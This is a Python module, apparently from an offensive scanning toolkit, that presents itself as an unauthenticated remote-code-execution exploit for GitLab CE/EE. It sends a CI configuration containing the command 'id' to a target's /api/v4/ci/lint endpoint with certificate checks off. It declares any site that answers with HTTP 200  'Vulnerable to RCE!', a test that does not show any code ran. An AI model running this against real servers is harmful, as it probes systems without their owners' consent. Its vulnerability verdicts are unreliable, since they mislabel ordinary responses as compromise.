import requests
from core.printmodels import *

class Gitlab_RCE_Exploit:
    def __init__(self):
        self.name = "GitLab RCE"
        self.description = "GitLab CE/EE Unauthenticated RCE"
        self.author = "@mrphoenix"

    def Exploit(self, site):
        try:
            endpoint = f"{site}/api/v4/ci/lint"
            headers = {"Content-Type": "application/json"}
            payload = {"content": "{\"image\":\"alpine:latest\",\"commands\":[\"id\"],\"before_script\":[\"id\"]}"}
            
            response = requests.post(endpoint, headers=headers, json=payload, verify=False, timeout=10)
            if response.status_code == 200:
                return PrintSuccess(f"[GitLab] Vulnerable to RCE!")
            return PrintFailed("[GitLab] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[GitLab] Error: {str(e)}")
